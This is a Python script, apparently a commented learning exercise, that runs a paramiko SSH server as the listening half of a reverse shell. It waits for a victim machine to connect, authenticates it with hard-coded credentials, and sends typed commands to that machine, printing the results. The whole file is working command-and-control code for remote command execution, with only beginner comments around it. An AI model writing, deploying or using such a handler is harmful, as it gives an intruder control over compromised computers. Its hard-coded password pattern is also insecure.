import os
import paramiko
import socket
import sys
import threading

# __file__ is a variable that contains the path to the module that is currently being imported
CWD = os.path.dirname(os.path.realpath(__file__))
# create a instance of public key
# os.path.join concats two or more paths together
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

# defines an interface for controlling paramiko in server mode
# and methods in this class automatically called


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()  # provide the communication between threads

    # called after authentication is complete
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'pinkywinky') and (password == 'istikbal55'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.1.42'
    ssh_port = 2222
    try:
        # creating a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                        1)  # setting options
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()  # unpacking the socket object and address('ip:port')
    except Exception as e:
        print(f'[-] Listen failed: {e}')
        sys.exit(1)
    # In case no exception occurs in the try clause, the else clause will execute.
    else:
        print('[+] Got a connection!', client, addr)  # !!!!!!

    # Create a new SSH session over an existing socket, or socket-like object.(It doesn't start the session)
    newSession = paramiko.Transport(client)
    newSession.add_server_key(HOSTKEY)
    server = Server()  # creating a Server object
    newSession.start_server(server=server)

    # returns the next channel that opened by client, it waits for 20 sec than timeouts
    chan = newSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))  # returns data from the cannel in string format
    chan.send('Your SSH session is started!')
    try:
        while True:
            command = input('Enter command:')
            if command != 'exit':
                chan.send(command)
                response = chan.recv(8096)
                print(response.decode())
            else:
                chan.send('exit')
                print('exiting')
                newSession.close()
                break
    except KeyboardInterrupt:
        newSession.close()
